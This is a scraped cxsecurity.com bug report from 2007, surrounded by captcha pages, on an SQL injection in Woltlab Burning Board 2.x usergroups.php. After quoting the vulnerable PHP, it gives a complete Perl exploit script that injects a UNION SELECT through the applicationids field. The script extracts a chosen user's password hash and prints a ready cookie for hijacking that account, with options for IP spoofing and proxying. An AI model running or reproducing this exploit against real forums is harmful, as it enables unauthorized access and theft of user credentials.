=== Content from cxsecurity.com_c5fb803d_20250126_104851.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_41a95ac8_20250126_104850.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_707ef27f_20250125_180006.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Woltab Burning Board SQL Injection usergroups.php** **2007.03.23** Credit:  **[x666](https://cxsecurity.com/author/x666/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2007-1518](https://cxsecurity.com/cveshow/CVE-2007-1518/ "Click to see CVE-2007-1518")** CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  CVSS Base Score: **7.5/10** Impact Subscore: **6.4/10** Exploitability Subscore: **10/10** Exploit range: **Remote** Attack complexity: **Low** Authentication: **No required** Confidentiality impact: **Partial** Integrity impact: **Partial** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

Hi,
A new SQL Injection in the wbb2.x
[CODE]
/\*\* delete applications (groupleader) \*\*/
if ($action == 'groupleaders\_deleteapplications') {
$deleteids = array();
if (is\_array($\_POST['applicationids'])) while (list($applicationid, $val) = each($\_POST['applicationids'])) if ($val == 1) $deleteids[] = $applicationid;
if ($deleteids) {
$result = $db->query("SELECT a.applicationid,gl.userid FROM bb".$n."\_applications a LEFT JOIN bb".$n."\_groupleaders gl ON (gl.groupid=a.groupid) WHERE applicationid IN(".implode(",", $deleteids).") AND gl.userid='$wbbuserdata[userid]'");
while ($row = $db->fetch\_array($result)) if ($row['userid'] == $wbbuserdata['userid']) $db->unbuffered\_query("DELETE FROM bb".$n."\_applications WHERE applicationid='$row[applicationid]'", 1);
}
header("Location: usergroups.php?action=groupleaders" . $SID\_ARG\_2ND\_UN);
exit;
}
[/CODE]
[EXPLOIT]
#!/usr/bin/perl
# Woltlab Burning Board 2.X usergroups.php SQL Injection exploit - burned2.pl
# written by x666 <blueshisha (at) safe-mail (dot) net [email concealed]>
# jmp-esp.kicks-ass.net;blueshisha.chills.it
# SR-CREW
# should work on every wbb regardless of php settings.
#
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Response;
use HTTP::Status;
use Getopt::Std;
getopt('uiUpAcC');
our ( $opt\_u, $opt\_i, $opt\_s, $opt\_U, $opt\_p, $opt\_A, $opt\_c, $opt\_C );
my $target = shift;
sub do\_request($$);
if ( !$target ) { &HELP\_MESSAGE; }
if ( !$opt\_U && !$opt\_C) { &HELP\_MESSAGE; }
my ( $host, $folder );
if ( $target =~ /(?:http://)?([w.-\_]\*)(/.\*)?/ ) {
$host = $1;
$folder = ( $2 ? $2 : '/' );
if ( $folder !~ //$/ ) { $folder .= '/'; }
$target = "http://$host$folder" . 'usergroups.php';
}
else { &HELP\_MESSAGE; }
my $ip = ( $opt\_i ? $opt\_i : '127.0.0.1' );
my ( $userid, $userpassword, $proxy, $proxyip );
( $userid, $userpassword ) = split( ':', $opt\_U ) if $opt\_U;
( $proxy, $proxyip ) = split( ':', $opt\_p ) if $opt\_p;
my $uid = ( $opt\_u ? $opt\_u : 1 );
my $useragent =
( $opt\_A ? $opt\_A : 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
my $prefix = ( $opt\_c ? $opt\_c : 'wbb2\_' );
my $isHash = 0;
print "burned2.pl written by x666n";
print "report errors @ blueshisha@safe-mail.net.. thxn";
print "[x] Attacking $target...n";
if ( $userpassword and $userpassword =~ /([a-f0-9]{32})/ ) { $isHash = 1; }
if ( !$opt\_c ) {
my $headers = do\_request( '', '' );
if ( $headers =~ /Set-Cookie: (.\*?)cookiehash/ ) {
$prefix = $1;
}
else { print $headers}
}
print "[x] Cookie prefix: $prefixn";
print "[x] Vulnerable check:";
my $answer;
my $pre;
$answer = do\_request( ''', '' );
if ( $answer =~ /FROM (.\*?)\_applications/ ) {
$pre = $1;
print " Vulnerablen";
}
elsif ($answer =~ /Ihnen wird der Zutritt zu dieser Seite/
or $answer =~ /Access denied/ )
{
print " No Idean";
print "[x] usergroups.php only for users,";
print " wrong userdetails or wrong cookie-prefix!n" if $opt\_U;
exit;
}
else {
print " Not Vulnerable!n";
print $answer;
exit;
}
print "[x] Unleashing black magic...n";
$answer = do\_request(
'/\*\*/UNIoN/\*\*/ SeLeCT/\*\*/ CoNcAT(password,CHAR(39)),'.$userid.' FROM '.$pre.'\_users wHere userid%3D'.$uid.'/\*%5D',''
);
if ( $answer =~ /${folder}usergroups.php/ and $answer =~ /([a-f0-9]{32})/ ) {
print "[x] Looks good!n";
print "[x] Userid: $uidn";
print "[x] Hash: $1n";
if ( !$opt\_C ) {
print
"[x] Use this Cookie:n ${prefix}userid=$uid;${prefix}userpassword=$1n";
}
}
else {
print "[x] Looks bad!n";
print $answer;
}
sub HELP\_MESSAGE() {
print "burned2.pl written by x666n"
. "perl $0 [options] urln"
. "examples:n"
. "perl $0 -U 10:123456 woltlab.de/de/forum/n"
. "perl $0 -u 2 -i 127.0.0.2 -U 10:123456 woltlab.de/de/forum/n"
. "overwrite -c only when the auto-check "
. "gives you a false resultn"
. "use -C when you need some special cookiesn"
. "options :n-u userid of victim [1]n"
. "-i faked client-ip [127.0.0.1]n"
. "-U userid:password or userid:pwhash [none]n"
. "-p proxyip:proxyport [none]n"
. "-A user-agent [firefox 1.5.09]n"
. "-c cookie-prefix [auto-check]n"
. "-C raw cookien";
exit;
}
sub do\_request($$) {
my $string = shift;
my $otherurl = shift;
if ($otherurl) { $target = "http://$host$folder" . $otherurl; }
else { $target = "http://$host$folder" . 'usergroups.php' }
$string = '/\*' if ( !$string );
my $ua = LWP::UserAgent->new;
if ($proxy) { $ua->proxy( 'http', "http://$proxy:$proxyip/" ); }
my $request = new HTTP::Request( 'POST', $target );
$request->content( 'applicationids%5B0)' . $string . '%5D=1'
. '&action=groupleaders\_deleteapplications');
$request->authorization\_basic('projectb', 'neustart');
$request->content\_type('application/x-www-form-urlencoded');
$request->header( 'User-Agent' => $useragent );
if ($opt\_U) {
my $userhash;
if ( !$isHash ) { $userhash = md5($userpassword); }
else { $userhash = $userpassword; }
my $cookie = $prefix
. 'userid='
. $userid . ';'
. $prefix
. 'userpassword='
. $userhash;
$request->header( 'Cookie' => $cookie );
}
elsif ($opt\_C) {
$request->header( 'Cookie' => $opt\_C );
$userid=3265;
}
$request->header( 'Client-Ip' => $ip );
my $response = $ua->request($request);
my $body = $response->content;
my $headers = $response->headers\_as\_string;
$body = $response->error\_as\_HTML if ( $response->is\_error );
return $headers if ( $string eq '/\*' and !$response->is\_error );
return $body;
}
# MD5 Code ripped from Libwhisker for bigger portability
# thx rfp :)
{
my ( @S, @T, @M );
my $code = '';
sub md5 {
return undef if ( !defined $\_[0] ); # oops, forgot the data
my $DATA = \_md5\_pad( $\_[0] );
&\_md5\_init() if ( !defined $M[0] );
return \_md5\_perl\_generated( $DATA );
}
sub \_md5\_init {
return if ( defined $S[0] );
my $i;
for ( $i = 1 ; $i <= 64 ; $i++ ) {
$T[ $i - 1 ] = int( ( 2\*\*32 ) \* abs( sin($i) ) );
}
my @t = ( 7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21 );
for ( $i = 0 ; $i < 64 ; $i++ ) {
$S[$i] = $t[ ( int( $i / 16 ) \* 4 ) + ( $i % 4 ) ];
}
@M = (
0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12,
5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2,
0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9
);
&\_md5\_generate();
my $TEST = \_md5\_pad('foobar');
if ( \_md5\_perl\_generated( $TEST ) ne
'3858f62230ac3c915f300c664312c63f' )
{
die('Error: MD5 self-test not successful.');
}
}
sub \_md5\_pad {
my $l = length( my $msg = shift() . chr(128) );
$msg .= "&#65533;" x ( ( $l % 64 <= 56 ? 56 : 120 ) - $l % 64 );
$l = ( $l - 1 ) \* 8;
$msg .= pack 'VV', $l & 0xffffffff, ( $l >> 16 >> 16 );
return $msg;
}
sub \_md5\_generate {
my $N = 'abcddabccdabbcda';
my ( $i, $M ) = ( 0, '' );
$M = '&0xffffffff' if ( ( 1 << 16 ) << 16 ); # mask for 64bit systems
$code = <<EOT;
sub \_md5\_perl\_generated {
BEGIN { $^H |= 1; }; # use integer
my ($A,$B,$C,$D)=(0x67452301,0xefcdab89,0x98badcfe,0x10325476);
my ($a,$b,$c,$d,$t,$i);
my $dr=shift;
my $l=length($$dr);
for my $L (0 .. (($l/64)-1) ) {
my @D = unpack('V16', substr($$dr, $L\*64,64));
($a,$b,$c,$d)=($A,$B,$C,$D);
EOT
for ( $i = 0 ; $i < 16 ; $i++ ) {
my ( $a, $b, $c, $d ) =
split( '', substr( $N, ( $i % 4 ) \* 4, 4 ) );
$code .=
"$t=(($$d^($$b&($$c^$$d)))+$$a+$D[$M[$i]]+$T[$i])$M;n";
$code .=
"$$a=((($t<<$S[$i])|(($t>>(32-$S[$i]))&((1<<$S[$i])-1)))+$$b)$M;n";
}
for ( ; $i < 32 ; $i++ ) {
my ( $a, $b, $c, $d ) =
split( '', substr( $N, ( $i % 4 ) \* 4, 4 ) );
$code .=
"$t=(($$c^($$d&($$b^$$c)))+$$a+$D[$M[$i]]+$T[$i])$M;n";
$code .=
"$$a=((($t<<$S[$i])|(($t>>(32-$S[$i]))&((1<<$S[$i])-1)))+$$b)$M;n";
}
for ( ; $i < 48 ; $i++ ) {
my ( $a, $b, $c, $d ) =
split( '', substr( $N, ( $i % 4 ) \* 4, 4 ) );
$code .= "$t=(($$b^$$c^$$d)+$$a+$D[$M[$i]]+$T[$i])$M;n";
$code .=
"$$a=((($t<<$S[$i])|(($t>>(32-$S[$i]))&((1<<$S[$i])-1)))+$$b)$M;n";
}
for ( ; $i < 64 ; $i++ ) {
my ( $a, $b, $c, $d ) =
split( '', substr( $N, ( $i % 4 ) \* 4, 4 ) );
$code .= "$t=(($$c^($$b|(~$$d)))+$$a+$D[$M[$i]]+$T[$i])$M;n";
$code .=
"$$a=((($t<<$S[$i])|(($t>>(32-$S[$i]))&((1<<$S[$i])-1)))+$$b)$M;n";
}
$code .= <<EOT;
$A=$A+$a&0xffffffff; $B=$B+$b&0xffffffff;
$C=$C+$c&0xffffffff; $D=$D+$d&0xffffffff;
} # for
return unpack('H\*', pack('V4',$A,$B,$C,$D)); }
EOT
eval "$code";
}
} # md5 package container
[/EXPLOIT]
Greets,
666

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007030153)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_c47bdfaf_20250126_104851.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


